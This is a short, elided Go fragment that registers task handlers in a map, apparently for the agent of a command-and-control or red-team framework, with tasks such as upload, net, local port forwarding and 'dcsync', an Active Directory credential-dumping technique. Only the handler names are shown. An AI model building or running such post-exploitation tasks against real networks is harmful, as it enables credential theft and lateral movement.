...
func init() {
	taskHandlers = map[string]taskHandler{
		...
		"upload":                 handleUpload,
		// mkdir/rename/chmod/hostinfo are bound via RegisterTask in
		// task_registry_v2.go — the new single-declaration idiom.
		"net":                      handleNet,
		...
		"lportfwd_start":           handleLPortFwdStart,
		"lportfwd_stop":            handleLPortFwdStop,
		"dcsync":                   handleDCSync,
